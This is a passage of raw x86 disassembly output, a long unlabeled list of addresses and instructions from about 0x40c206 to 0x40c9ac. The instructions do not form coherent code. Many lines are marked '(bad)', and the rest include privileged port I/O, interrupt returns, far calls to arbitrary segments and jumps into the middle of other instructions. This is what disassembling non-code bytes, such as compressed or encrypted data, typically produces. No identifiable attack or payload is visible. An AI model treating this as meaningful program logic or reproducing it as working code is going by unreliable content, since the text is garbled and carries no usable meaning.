  40c206:	mov    cl,0x25
  40c208:	into   
  40c209:	int    0x53
  40c20b:	jp     0x40c218
  40c20d:	pop    ss
  40c20e:	in     al,dx
  40c20f:	pusha  
  40c210:	mov    edx,0x391ea461
  40c215:	adc    DWORD PTR es:[eax+0xeefe7f5],edx
  40c21c:	jle    0x40c23a
  40c21e:	sbb    BYTE PTR [ebp-0x74419313],ch
  40c224:	push   ds
  40c225:	arpl   WORD PTR [edx],bp
  40c227:	mov    WORD PTR [edi+eax*2],fs
  40c22a:	xchg   BYTE PTR [edi+0x4c],dl
  40c22d:	cmc    
  40c22e:	retf   0x981
  40c231:	pop    ebp
  40c232:	pop    ecx
  40c233:	sub    DWORD PTR [ebx-0x300b1665],0x35288ccc
  40c23d:	call   0x9b0a:0x9bd4b3ad
  40c244:	pop    ebp
  40c245:	test   eax,0xc0c3e390
  40c24a:	pop    esi
  40c24b:	aas    
  40c24c:	adc    dl,BYTE PTR [ecx+esi*8+0x79]
  40c250:	js     0x40c216
  40c252:	aam    0xc7
  40c254:	lds    ebx,FWORD PTR [eax+0x3d]
  40c257:	das    
  40c258:	es std 
  40c25a:	cmp    al,0xb2
  40c25c:	shl    ecx,0x99
  40c25f:	adc    al,0x98
  40c261:	mov    esi,0x74983be0
  40c266:	cmp    eax,0xc470a152
  40c26b:	in     al,0xfb
  40c26d:	sub    BYTE PTR [edi+0x73],dl
  40c270:	jecxz  0x40c213
  40c272:	add    eax,0x1e910482
  40c277:	mov    DWORD PTR [ebx],ebp
  40c279:	add    ah,ah
  40c27b:	dec    ebp
  40c27c:	retf   0xc91e
  40c27f:	dec    esi
  40c280:	dec    esi
  40c281:	(bad)  
  40c282:	jne    0x40c20c
  40c284:	jl     0x40c23e
  40c286:	dec    ebx
  40c287:	mov    cl,0x80
  40c289:	and    DWORD PTR [edi-0x2da5cd20],esp
  40c28f:	iret   
  40c290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c291:	jns    0x40c222
  40c293:	les    edx,FWORD PTR [edx]
  40c295:	(bad)  
  40c296:	cmp    ah,ah
  40c298:	pop    edi
  40c299:	sbb    cl,cl
  40c29b:	dec    eax
  40c29c:	daa    
  40c29d:	cmp    eax,0xaa58abaf
  40c2a2:	push   edi
  40c2a3:	aaa    
  40c2a4:	dec    edx
  40c2a5:	arpl   bp,ax
  40c2a7:	mov    edi,0xa40008fc
  40c2ac:	and    eax,0x5bc618fa
  40c2b1:	cs stos DWORD PTR es:[edi],eax
  40c2b3:	fstp   QWORD PTR [ebp+0x2fed7eb7]
  40c2b9:	and    ah,BYTE PTR [edi+0x40bd0332]
  40c2bf:	aas    
  40c2c0:	mov    ds,WORD PTR [ebx+0xa]
  40c2c3:	mov    al,0xd8
  40c2c5:	inc    ebx
  40c2c6:	adc    al,0x45
  40c2c8:	int3   
  40c2c9:	or     BYTE PTR [ebx+0x72d759c1],bl
  40c2cf:	out    0x61,al
  40c2d1:	sub    bl,ch
  40c2d3:	cli    
  40c2d4:	lock cwde 
  40c2d6:	pop    ds
  40c2d7:	lods   eax,DWORD PTR ds:[esi]
  40c2d8:	dec    esp
  40c2d9:	mov    cl,0x23
  40c2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2dc:	push   0xffffff8b
  40c2de:	icebp  
  40c2df:	dec    edx
  40c2e0:	stos   DWORD PTR es:[edi],eax
  40c2e1:	dec    esp
  40c2e2:	pop    eax
  40c2e3:	loope  0x40c362
  40c2e5:	imul   BYTE PTR ds:0x381a3a1b
  40c2eb:	inc    eax
  40c2ec:	and    edx,DWORD PTR [esi]
  40c2ee:	in     eax,0xe6
  40c2f0:	loopne 0x40c2bb
  40c2f2:	clc    
  40c2f3:	jge    0x40c2ee
  40c2f5:	inc    esp
  40c2f6:	sub    al,0x89
  40c2f8:	inc    esp
  40c2f9:	test   eax,0x72a8c354
  40c2fe:	mov    eax,ds:0xe41683f8
  40c303:	mov    ds:0xf79b9d82,eax
  40c308:	xchg   ebp,eax
  40c309:	stos   DWORD PTR es:[edi],eax
  40c30a:	adc    eax,DWORD PTR [edx+esi*8+0x794c3c63]
  40c311:	aaa    
  40c312:	daa    
  40c313:	cmp    eax,0x3962b492
  40c318:	les    edi,FWORD PTR [ebx+0x52]
  40c31b:	test   eax,0x85ec1569
  40c320:	scas   eax,DWORD PTR es:[edi]
  40c321:	lock mov bl,0x20
  40c324:	sbb    DWORD PTR [edx+0x143500ed],esp
  40c32a:	sbb    al,0x47
  40c32c:	scas   eax,DWORD PTR es:[edi]
  40c32d:	hlt    
  40c32e:	add    edi,DWORD PTR [ebp+eiz*1+0x3556e23a]
  40c335:	out    0xf6,al
  40c337:	daa    
  40c338:	pop    edx
  40c339:	and    eax,0xd0c547e3
  40c33e:	iret   
  40c33f:	mov    ds:0x8dfe46fc,eax
  40c344:	loop   0x40c2f3
  40c346:	fistp  DWORD PTR [ebx+ecx*1]
  40c349:	cmp    al,0x23
  40c34b:	gs mov cl,0x72
  40c34e:	aaa    
  40c34f:	call   0xe5b80f94
  40c354:	xchg   edi,eax
  40c355:	cli    
  40c356:	(bad)  
  40c357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c358:	cmp    BYTE PTR [esi-0x70803dc7],bh
  40c35e:	jge    0x40c322
  40c360:	lds    edi,FWORD PTR [ebx-0x1eab2ee]
  40c366:	leave  
  40c367:	sub    al,bh
  40c369:	adc    BYTE PTR [ecx+0x13],cl
  40c36c:	mov    bh,0x66
  40c36e:	int3   
  40c36f:	sahf   
  40c370:	fistp  WORD PTR ss:[ebx+0x5a]
  40c374:	rcl    esp,cl
  40c376:	cld    
  40c377:	mov    ds:0xb441bf91,eax
  40c37c:	neg    BYTE PTR [esi]
  40c37e:	mov    WORD PTR [eax+0x6c],ds
  40c381:	add    DWORD PTR [edi-0x41],esp
  40c384:	call   0xae8d:0xcb8fda85
  40c38b:	lods   eax,DWORD PTR ds:[esi]
  40c38c:	or     al,0x7a
  40c38e:	aaa    
  40c38f:	cmp    BYTE PTR [esi-0x19],al
  40c392:	call   0x89922125
  40c397:	addr16 sbb eax,0xa982a33a
  40c39d:	pop    es
  40c39e:	sbb    al,0x8f
  40c3a0:	mov    ch,0xc3
  40c3a2:	test   DWORD PTR [esi+0x56],edi
  40c3a5:	push   ebp
  40c3a6:	js     0x40c342
  40c3a8:	rcr    BYTE PTR [esp+esi*8-0x7a6f52d5],0xe5
  40c3b0:	jge    0x40c3d8
  40c3b2:	fimul  DWORD PTR [edx+0x3b]
  40c3b5:	call   0xee93c220
  40c3ba:	pop    esp
  40c3bb:	es push esp
  40c3bd:	add    eax,0x6035f3f9
  40c3c2:	sub    bh,BYTE PTR [esi]
  40c3c4:	hlt    
  40c3c5:	es add al,0x4c
  40c3c8:	cmp    edx,0xbf8b5481
  40c3ce:	inc    esp
  40c3cf:	fld    QWORD PTR [edi]
  40c3d1:	pop    esi
  40c3d2:	xor    eax,0x8704b013
  40c3d7:	sub    DWORD PTR [ebx-0x1c6ce7be],ebx
  40c3dd:	sub    DWORD PTR [edx],esp
  40c3df:	fbstp  TBYTE PTR [ebx+0x6b962f69]
  40c3e5:	stc    
  40c3e6:	xlat   BYTE PTR ds:[ebx]
  40c3e7:	cmp    al,0xd9
  40c3e9:	mov    edi,0x8a4b973c
  40c3ee:	jae    0x40c3eb
  40c3f0:	lods   al,BYTE PTR ds:[esi]
  40c3f1:	sub    eax,0x351e76d4
  40c3f6:	jg     0x40c46c
  40c3f8:	ret    0xb684
  40c3fb:	or     eax,0xc64f119e
  40c400:	mov    al,ds:0xb69524be
  40c405:	xor    eax,0x70a94907
  40c40a:	push   ebp
  40c40b:	stos   BYTE PTR es:[edi],al
  40c40c:	(bad)  
  40c40d:	inc    DWORD PTR [ecx-0x44]
  40c410:	mov    ebx,0xb715e297
  40c415:	rcl    DWORD PTR [ecx+0x787cf4b7],0x3c
  40c41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c41d:	and    al,0xab
  40c41f:	push   ebx
  40c420:	sar    BYTE PTR [eax],1
  40c422:	sbb    eax,0xa5d053f3
  40c427:	and    cl,BYTE PTR [ebp+ebx*8+0x5b]
  40c42b:	ficomp DWORD PTR [ebp+0x7259be29]
  40c431:	xchg   esi,eax
  40c432:	jge    0x40c3de
  40c434:	mov    ebx,0xd46e2320
  40c439:	mov    al,ds:0x53099624
  40c43e:	in     eax,0x7e
  40c440:	lea    ebp,[ebx+0x143ac385]
  40c446:	push   cs
  40c447:	push   cs
  40c448:	jns    0x40c3ca
  40c44a:	loope  0x40c4be
  40c44c:	push   edx
  40c44d:	sbb    al,0x16
  40c44f:	jbe    0x40c3ec
  40c451:	call   0xf3227500
  40c456:	add    BYTE PTR [ebx],dh
  40c458:	jns    0x40c4ab
  40c45a:	stc    
  40c45b:	sbb    esp,DWORD PTR [eax+0x4e]
  40c45e:	aas    
  40c45f:	(bad)  
  40c460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c461:	ss in  eax,0xd
  40c464:	popf   
  40c465:	retf   0x283d
  40c468:	(bad)  
  40c46c:	mov    dh,0x49
  40c46e:	add    eax,0x27e5705c
  40c473:	adc    BYTE PTR [edx+edx*8+0x7be555a5],bh
  40c47a:	dec    ebx
  40c47b:	call   0x81c9ccc3
  40c480:	or     BYTE PTR [ecx],bh
  40c482:	ss ss push eax
  40c485:	cs jno 0x40c480
  40c488:	sbb    al,0xf1
  40c48a:	mov    cl,0xdf
  40c48c:	rcl    ebp,cl
  40c48e:	sbb    eax,0xad9f01fa
  40c493:	scas   eax,DWORD PTR es:[edi]
  40c494:	mov    ds:0x81e349c2,eax
  40c499:	jmp    0x40c442
  40c49b:	cmp    edx,ebp
  40c49d:	ds jp  0x40c472
  40c4a0:	mov    ch,0xc4
  40c4a2:	sub    BYTE PTR [esi],ah
  40c4a4:	add    ah,BYTE PTR [eax-0x54477ad7]
  40c4aa:	jns    0x40c504
  40c4ac:	dec    edx
  40c4ad:	cmc    
  40c4ae:	sub    edi,ebp
  40c4b0:	cli    
  40c4b1:	pop    ss
  40c4b2:	loope  0x40c48a
  40c4b4:	mov    ch,0x42
  40c4b6:	push   edi
  40c4b7:	push   eax
  40c4b8:	sbb    dl,dl
  40c4ba:	cmp    al,0xea
  40c4bc:	jnp    0x40c477
  40c4be:	in     al,dx
  40c4bf:	jno    0x40c457
  40c4c1:	sub    ch,ch
  40c4c3:	std    
  40c4c4:	sub    BYTE PTR [eax+0x926daf6],bl
  40c4ca:	mov    ds:0xc2324698,al
  40c4cf:	in     al,0x2
  40c4d1:	rol    ebp,0xc7
  40c4d4:	rol    BYTE PTR [ebp+0x5e550645],1
  40c4da:	jae    0x40c4de
  40c4dc:	iret   
  40c4dd:	lahf   
  40c4de:	cwde   
  40c4df:	outs   dx,DWORD PTR ds:[esi]
  40c4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e1:	rol    BYTE PTR [edx+0x5e],cl
  40c4e4:	xchg   ebx,eax
  40c4e5:	jmp    0x7066:0x3fa6abd0
  40c4ec:	xlat   BYTE PTR ds:[ebx]
  40c4ed:	push   eax
  40c4ee:	jno    0x40c487
  40c4f0:	mov    esi,0xba55d01c
  40c4f5:	mov    dl,0x8b
  40c4f7:	in     al,0x21
  40c4f9:	out    0xf9,al
  40c4fb:	out    0x17,eax
  40c4fd:	inc    edi
  40c4fe:	pop    esi
  40c4ff:	or     edx,DWORD PTR cs:[ebx+0x797e6563]
  40c506:	or     BYTE PTR [esi*2-0x33dcc41e],ah
  40c50d:	int3   
  40c50e:	daa    
  40c50f:	dec    edx
  40c510:	int3   
  40c511:	inc    edi
  40c512:	jmp    0xdc73:0x57c35515
  40c519:	(bad)  
  40c51a:	jne    0x40c4a6
  40c51c:	sbb    esi,esp
  40c51e:	test   eax,0x1c0f03
  40c523:	and    al,BYTE PTR [esi+0x43]
  40c526:	jns    0x40c586
  40c528:	retf   0x5d06
  40c52b:	retf   
  40c52c:	pop    esi
  40c52d:	in     al,0x44
  40c52f:	fst    QWORD PTR [edi+edx*4]
  40c532:	hlt    
  40c533:	xchg   ecx,ebp
  40c535:	inc    ecx
  40c536:	fdivr  st(7),st
  40c538:	ss mov edi,0x4a1c16cb
  40c53e:	fsubr  QWORD PTR [esi+ebp*1]
  40c541:	push   ds
  40c542:	retf   
  40c543:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c545:	push   0x54
  40c547:	push   ebp
  40c548:	test   eax,0xd0e68770
  40c54d:	push   ebp
  40c54e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c54f:	(bad)
  40c552:	sub    ah,BYTE PTR [edi-0x62]
  40c555:	shr    DWORD PTR [edx+0x3768ae82],cl
  40c55b:	lods   al,BYTE PTR ds:[esi]
  40c55c:	dec    ecx
  40c55d:	and    edi,ecx
  40c55f:	xor    DWORD PTR [ebx-0x30ea95aa],eax
  40c565:	ret    0x403a
  40c568:	inc    ebx
  40c569:	adc    ebp,edx
  40c56b:	rol    BYTE PTR [ecx],0xa0
  40c56e:	xor    eax,0x102ab4fa
  40c573:	dec    ebx
  40c574:	xchg   esp,eax
  40c575:	jae    0x40c568
  40c577:	dec    edx
  40c578:	(bad)  
  40c579:	in     al,dx
  40c57a:	push   edi
  40c57b:	cmp    BYTE PTR [edi+0x6f60616f],ah
  40c581:	cmp    ch,al
  40c583:	cli    
  40c584:	xchg   bl,dh
  40c586:	test   DWORD PTR [edx+edi*2],esp
  40c589:	(bad)  
  40c58a:	mov    bh,0x11
  40c58c:	out    dx,ax
  40c58e:	cmp    cl,ah
  40c590:	lea    esp,[ebx]
  40c592:	sti    
  40c593:	xchg   esi,eax
  40c594:	aad    0x5c
  40c596:	push   0xe501af7b
  40c59b:	idiv   DWORD PTR [esi+0x7b]
  40c59e:	arpl   di,dx
  40c5a0:	mov    ebx,DWORD PTR [edi+edi*1]
  40c5a3:	icebp  
  40c5a4:	js     0x40c5c5
  40c5a6:	xor    al,0x65
  40c5a8:	pop    es
  40c5a9:	push   eax
  40c5aa:	pushf  
  40c5ab:	xchg   BYTE PTR [esi-0x4],dl
  40c5ae:	cli    
  40c5af:	das    
  40c5b0:	push   ebp
  40c5b1:	adc    al,0xef
  40c5b3:	jge    0x40c5d6
  40c5b5:	dec    edi
  40c5b6:	lds    edx,FWORD PTR [edx-0x7fcd4789]
  40c5bc:	call   0x92bbb46c
  40c5c1:	xlat   BYTE PTR ds:[ebx]
  40c5c2:	ja     0x40c54e
  40c5c4:	dec    edi
  40c5c5:	mul    BYTE PTR [ecx-0x7c]
  40c5c8:	sub    DWORD PTR [ebp+0x5b],ebx
  40c5cb:	pop    ds
  40c5cc:	sti    
  40c5cd:	pop    ebp
  40c5ce:	rcl    DWORD PTR [esi-0x312d8af8],1
  40c5d4:	mov    BYTE PTR [edx+0x2e],ah
  40c5d7:	add    al,0x5d
  40c5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5da:	fisubr DWORD PTR [eax]
  40c5dc:	fidivr WORD PTR [ebp-0x232e685d]
  40c5e2:	mov    al,ds:0xbd9e68dc
  40c5e7:	mov    al,ch
  40c5e9:	xor    DWORD PTR ds:0xfdb06a2c,ebx
  40c5ef:	mov    esp,0xa38773f5
  40c5f4:	sbb    cl,al
  40c5f6:	out    dx,ax
  40c5f8:	dec    ebp
  40c5f9:	imul   DWORD PTR [ecx]
  40c5fb:	and    dh,BYTE PTR [edx]
  40c5fd:	ds int3 
  40c5ff:	xchg   ebp,eax
  40c600:	or     edi,DWORD PTR [ecx+eiz*2-0xb701fd8]
  40c607:	or     edx,edi
  40c609:	xchg   DWORD PTR [edx+ebx*2-0x5f],edi
  40c60d:	leave  
  40c60e:	(bad)  
  40c610:	pushf  
  40c611:	aas    
  40c612:	data16 addr16 fwait
  40c615:	hlt    
  40c616:	push   ds
  40c617:	push   edx
  40c618:	sbb    BYTE PTR [eax],ch
  40c61a:	lods   eax,DWORD PTR ds:[esi]
  40c61b:	mov    ?,WORD PTR ds:0x3991e1ed
  40c621:	pop    es
  40c622:	loope  0x40c611
  40c624:	adc    eax,0xbc1cb1b2
  40c629:	add    cl,dl
  40c62b:	cdq    
  40c62c:	xchg   ecx,eax
  40c62d:	stos   DWORD PTR es:[edi],eax
  40c62e:	cmp    BYTE PTR [ebp+eax*4+0x41],0xe2
  40c633:	data16 sbb al,0x9b
  40c636:	inc    edx
  40c637:	xchg   esp,eax
  40c638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c639:	mov    bl,BYTE PTR [edi]
  40c63b:	imul   esi,edi,0x11171e13
  40c641:	fs daa 
  40c643:	adc    bl,bh
  40c645:	cmp    esp,ecx
  40c647:	jmp    0x899ce6c7
  40c64c:	enter  0xf5c7,0x88
  40c650:	ja     0x40c632
  40c652:	stos   DWORD PTR es:[edi],eax
  40c653:	loopne 0x40c65d
  40c655:	mov    eax,ds:0x5c186c92
  40c65a:	mov    ds:0xf8fd212a,eax
  40c65f:	sub    eax,0x9f20a5b5
  40c664:	add    al,0xf2
  40c666:	ret    0xbd86
  40c669:	test   BYTE PTR [ebp+eax*1+0x3554b227],0x82
  40c671:	and    BYTE PTR [edi-0x7754404],ch
  40c677:	jmp    0x40c63e
  40c679:	aaa    
  40c67a:	loopne 0x40c673
  40c67c:	dec    esi
  40c67d:	outs   dx,DWORD PTR ds:[esi]
  40c67e:	or     ch,bh
  40c680:	lahf   
  40c681:	ror    BYTE PTR [ebp+0x48dfcd35],1
  40c687:	repz fistp QWORD PTR [ebp+esi*8-0x6ee6ac5a]
  40c68f:	in     al,dx
  40c690:	xchg   BYTE PTR [eax],al
  40c692:	(bad)  
  40c693:	ds fwait
  40c695:	popa   
  40c696:	xchg   DWORD PTR [ebx],esi
  40c698:	cli    
  40c699:	mov    esi,0x787ffb9b
  40c69e:	mov    al,0x2b
  40c6a0:	sti    
  40c6a1:	mov    al,0x24
  40c6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a4:	fmul   st(7),st
  40c6a6:	sbb    esp,DWORD PTR [ebx+0x20e569bf]
  40c6ac:	jl     0x40c63c
  40c6ae:	lahf   
  40c6af:	lock ins DWORD PTR es:[edi],dx
  40c6b1:	fmul   st,st(7)
  40c6b3:	mov    WORD PTR [edi-0x69d84540],gs
  40c6b9:	std    
  40c6ba:	popf   
  40c6bb:	inc    edi
  40c6bc:	pop    es
  40c6bd:	sbb    BYTE PTR [ebx+0x27],0x58
  40c6c1:	pop    edi
  40c6c2:	jmp    0xaac2:0x8a9e144e
  40c6c9:	jp     0x40c65a
  40c6cb:	mov    dl,0xf6
  40c6cd:	popa   
  40c6ce:	jno    0x40c690
  40c6d0:	call   0xa9226126
  40c6d5:	jl     0x40c6d3
  40c6d7:	mov    eax,0x287327db
  40c6dc:	inc    esi
  40c6dd:	ret    
  40c6de:	loope  0x40c6ff
  40c6e0:	bound  ebp,QWORD PTR [ebx-0x7d]
  40c6e3:	pop    ecx
  40c6e4:	cs mov ecx,0x2af9a1ea
  40c6ea:	paddusb mm5,mm6
  40c6ed:	inc    edi
  40c6ee:	repnz mov esi,0xad771ed3
  40c6f4:	ja     0x40c684
  40c6f6:	jb     0x40c75a
  40c6f8:	cwde   
  40c6f9:	je     0x40c72a
  40c6fb:	mov    ebx,0x833a14c3
  40c700:	xor    BYTE PTR [edx],ch
  40c702:	pop    ss
  40c703:	cmp    ebp,DWORD PTR [edx-0x18]
  40c706:	push   ebx
  40c707:	jb     0x40c716
  40c709:	pop    eax
  40c70a:	into   
  40c70b:	loopne 0x40c75c
  40c70d:	sub    al,0x33
  40c70f:	ret    
  40c710:	pop    edi
  40c711:	jge    0x40c733
  40c713:	enter  0x1806,0x75
  40c717:	jne    0x40c774
  40c719:	cli    
  40c71a:	aam    0xe5
  40c71c:	push   edi
  40c71d:	mov    ecx,0x16e9b67f
  40c722:	les    ebp,FWORD PTR [ebp+0x64420e71]
  40c728:	and    dh,BYTE PTR [ecx+0x7cdedf8a]
  40c72e:	pop    ds
  40c72f:	(bad)  
  40c730:	fsub   DWORD PTR [eax+0x133ed0b9]
  40c736:	adc    bh,BYTE PTR [ebx]
  40c738:	or     al,0x51
  40c73a:	jl     0x40c74e
  40c73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73d:	fidivr DWORD PTR [esi]
  40c73f:	or     DWORD PTR [ecx+edi*8-0x48],ecx
  40c743:	add    BYTE PTR [eax],dh
  40c745:	pop    eax
  40c746:	push   edi
  40c747:	cmovbe esi,edx
  40c74a:	retf   0x3c58
  40c74d:	dec    ebp
  40c74e:	enter  0xd8c2,0x95
  40c752:	mov    ds,WORD PTR [esi+0x56cae4dc]
  40c758:	pop    ds
  40c759:	mov    esi,0x991632ab
  40c75e:	and    edi,DWORD PTR [ebx+eax*8]
  40c761:	rol    BYTE PTR [esi+0x3100738a],1
  40c767:	inc    edx
  40c768:	lods   al,BYTE PTR ds:[esi]
  40c769:	rcr    BYTE PTR [ecx],cl
  40c76b:	mov    eax,0x45351106
  40c770:	mov    bl,0x4d
  40c772:	mul    BYTE PTR [ebx-0x24]
  40c775:	jge    0x40c765
  40c777:	ds mov edi,0x7024e2f9
  40c77d:	mov    ebp,DWORD PTR [edx-0x443adcb4]
  40c783:	fsubr  st(7),st
  40c785:	outs   dx,DWORD PTR ds:[esi]
  40c786:	add    al,0x57
  40c788:	xor    BYTE PTR [edi+0x7f3a187],ah
  40c78e:	or     DWORD PTR [eax],esi
  40c790:	call   0x474620e8
  40c795:	loop   0x40c808
  40c797:	mov    cl,0x7
  40c799:	lock sbb al,BYTE PTR [ebx]
  40c79c:	pusha  
  40c79d:	inc    edx
  40c79e:	inc    edx
  40c79f:	cld    
  40c7a0:	js     0x40c7b2
  40c7a2:	popa   
  40c7a3:	mov    BYTE PTR [esi+0x17240c08],bl
  40c7a9:	ret    0x633c
  40c7ac:	faddp  st(7),st
  40c7ae:	stos   DWORD PTR es:[edi],eax
  40c7af:	fcomip st,st(1)
  40c7b1:	mov    ecx,0x684f0aca
  40c7b6:	enter  0x7b44,0xa6
  40c7ba:	aas    
  40c7bb:	js     0x40c7f4
  40c7bd:	repz mov al,0x69
  40c7c0:	jnp    0x40c7c3
  40c7c2:	sti    
  40c7c3:	and    ebp,DWORD PTR [eax+0x73a92d8a]
  40c7c9:	ins    DWORD PTR es:[edi],dx
  40c7ca:	mov    ecx,0x7f2298ba
  40c7cf:	sub    BYTE PTR [edx],bh
  40c7d1:	mov    ch,0x52
  40c7d3:	je     0x40c83f
  40c7d5:	xor    esi,ecx
  40c7d7:	jge    0x40c770
  40c7d9:	push   ds
  40c7da:	loop   0x40c833
  40c7dc:	inc    esi
  40c7dd:	mov    ebx,ebp
  40c7df:	in     al,0xb8
  40c7e1:	cs jns 0x40c84a
  40c7e4:	and    ch,BYTE PTR [esi]
  40c7e6:	adc    esp,DWORD PTR [eax-0x6c]
  40c7e9:	xor    BYTE PTR [edi+0x2d],cl
  40c7ec:	sbb    esp,eax
  40c7ee:	push   esp
  40c7ef:	in     eax,dx
  40c7f0:	je     0x40c86c
  40c7f2:	add    DWORD PTR [esi+0x5022a1a2],0x663370b3
  40c7fc:	mov    al,0xf5
  40c7fe:	not    DWORD PTR [edi]
  40c800:	mov    eax,ds:0x2445d614
  40c805:	xchg   edi,eax
  40c806:	fucomp st(3)
  40c808:	gs aad 0x2d
  40c80b:	pop    edx
  40c80c:	test   BYTE PTR [ebx-0x1a79278d],dl
  40c812:	aad    0x4c
  40c814:	stos   DWORD PTR es:[edi],eax
  40c815:	xor    al,0x65
  40c817:	call   0x3bef:0xadd0a392
  40c81e:	jl     0x40c83c
  40c820:	jnp    0x40c808
  40c822:	mov    bh,0x81
  40c824:	xchg   esp,eax
  40c825:	out    0x64,al
  40c827:	inc    esp
  40c828:	mov    bl,0x51
  40c82a:	dec    edi
  40c82b:	shl    BYTE PTR [edx-0x3f],0x1c
  40c82f:	nop
  40c830:	push   esi
  40c831:	lods   eax,DWORD PTR ds:[esi]
  40c832:	jl     0x40c886
  40c834:	mov    ch,cl
  40c836:	aam    0xbd
  40c838:	imul   esi,ebp,0xffffff8b
  40c83b:	fwait
  40c83c:	sub    dh,dl
  40c83e:	cmc    
  40c83f:	inc    edi
  40c840:	fisttp DWORD PTR [edx+0x4c]
  40c843:	xchg   al,bl
  40c845:	in     eax,0xfd
  40c847:	into   
  40c848:	imul   edi,DWORD PTR [esi+0x74e5e5c0],0x67
  40c84f:	mov    bl,0x46
  40c851:	mov    eax,ds:0x665444c1
  40c856:	xchg   ebx,eax
  40c857:	or     edx,edx
  40c859:	adc    esp,DWORD PTR [edi+eax*2+0x1e]
  40c85d:	sub    edi,0x3a8b95a9
  40c863:	aam    0x15
  40c865:	sahf   
  40c866:	out    dx,al
  40c867:	in     al,0x66
  40c869:	call   0x89f2:0x2d1fa567
  40c870:	mov    edx,0xe9fd5385
  40c875:	mov    eax,0x74c37c70
  40c87a:	xchg   ebp,eax
  40c87b:	cmp    al,0x25
  40c87d:	jno    0x40c8dc
  40c87f:	pop    ds
  40c880:	je     0x40c8b7
  40c882:	retf   
  40c883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c884:	cmp    ebp,DWORD PTR [edx]
  40c886:	jg     0x40c864
  40c888:	or     DWORD PTR [edi+0x12],0xe6f8fa9b
  40c88f:	add    DWORD PTR [edx-0x1a],ebx
  40c892:	sub    bh,bl
  40c894:	inc    ebp
  40c895:	push   0x4b843e0d
  40c89a:	(bad)  
  40c89b:	ins    DWORD PTR es:[edi],dx
  40c89c:	les    eax,FWORD PTR [ecx+0x7edfb0a3]
  40c8a2:	dec    esp
  40c8a3:	cmc    
  40c8a4:	(bad)  
  40c8a5:	and    bh,BYTE PTR [esi+0x4b1e970e]
  40c8ab:	xor    eax,0x167112e8
  40c8b0:	(bad)  
  40c8b1:	xchg   edi,eax
  40c8b2:	aas    
  40c8b3:	jl     0x40c855
  40c8b5:	jle    0x40c897
  40c8b7:	xchg   ebx,eax
  40c8b8:	out    dx,eax
  40c8b9:	call   0xacfe:0xa1fb78df
  40c8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8c1:	call   0x35fe712d
  40c8c6:	imul   eax,edx,0x91214bab
  40c8cc:	push   ds
  40c8cd:	sub    eax,0xe58d0bd6
  40c8d2:	fild   QWORD PTR [ebx-0x2]
  40c8d5:	adc    eax,0x9a9d0628
  40c8da:	shl    DWORD PTR [edi+0x17],1
  40c8dd:	adc    DWORD PTR [edi-0x6b5fe1ab],eax
  40c8e3:	inc    esp
  40c8e4:	inc    edx
  40c8e5:	hlt    
  40c8e6:	ins    BYTE PTR es:[edi],dx
  40c8e7:	mov    dl,0x5c
  40c8e9:	sbb    DWORD PTR [esp+eax*4-0x6718936d],ebp
  40c8f0:	sbb    esi,DWORD PTR [edx-0x27a9f9be]
  40c8f6:	lahf   
  40c8f7:	or     edi,DWORD PTR [ecx]
  40c8f9:	adc    dl,BYTE PTR [esi+eiz*2]
  40c8fc:	jmp    0x40c89c
  40c8fe:	cli    
  40c8ff:	mov    eax,ds:0xc29b848d
  40c904:	out    0xa,al
  40c906:	jns    0x40c97e
  40c908:	dec    edi
  40c909:	retf   
  40c90a:	sbb    ebp,edx
  40c90c:	iret   
  40c90d:	cmp    bl,BYTE PTR [ebx-0x559039a0]
  40c913:	xchg   BYTE PTR [ecx-0x26],dl
  40c916:	add    edx,DWORD PTR [edx]
  40c918:	pop    es
  40c919:	mov    ebx,0x58af922c
  40c91e:	sar    BYTE PTR [esp+edi*8-0x13],cl
  40c922:	arpl   bx,cx
  40c924:	or     edx,DWORD PTR [eax+0x1f51ad62]
  40c92a:	pop    ss
  40c92b:	xor    al,BYTE PTR [eax]
  40c92d:	sub    cl,bl
  40c92f:	mov    eax,ds:0xdd616eb5
  40c934:	jle    0x40c996
  40c936:	xchg   edi,eax
  40c937:	in     eax,dx
  40c938:	push   edi
  40c939:	and    eax,0x197f2c4a
  40c93e:	(bad)  
  40c93f:	retf   0xc7c9
  40c942:	jge    0x40c93b
  40c944:	ret    0xdf77
  40c947:	jle    0x40c907
  40c949:	mov    cl,0x89
  40c94b:	pop    edi
  40c94c:	and    BYTE PTR [ecx-0x537b06af],cl
  40c952:	pop    esp
  40c953:	add    bh,BYTE PTR [esi]
  40c955:	mov    edi,0x2740abab
  40c95a:	xor    esp,ebx
  40c95c:	push   esp
  40c95d:	add    DWORD PTR [edi*4-0x39c3429c],0xa3c2e8a3
  40c968:	jp     0x40c9d5
  40c96a:	adc    eax,0xa6df70e6
  40c96f:	adc    DWORD PTR [eax+0x5b61db91],esi
  40c975:	sbb    eax,0xba6a9263
  40c97a:	dec    esp
  40c97b:	mov    cl,0xb9
  40c97d:	mov    dl,0xab
  40c97f:	sbb    al,BYTE PTR cs:[ecx]
  40c982:	pop    ebx
  40c983:	xlat   BYTE PTR ds:[ebx]
  40c984:	outs   dx,BYTE PTR ds:[esi]
  40c985:	nop
  40c986:	neg    ebp
  40c988:	popa   
  40c989:	call   0xcd37:0x409cebf1
  40c990:	pop    esi
  40c991:	imul   esp,ebp,0x7a
  40c994:	stc    
  40c995:	sub    BYTE PTR [eax+0x3a2f5e2e],ah
  40c99b:	inc    esp
  40c99c:	push   eax
  40c99d:	add    BYTE PTR [ecx+0x25cc2dd0],bl
  40c9a3:	dec    esp
  40c9a4:	jo     0x40ca02
  40c9a6:	daa    
  40c9a7:	jp     0x40c93d
  40c9a9:	aaa    
  40c9aa:	rcr    BYTE PTR [eax],cl
  40c9ac:	xor    DWORD PTR [esi-0x4e4195a6],eax
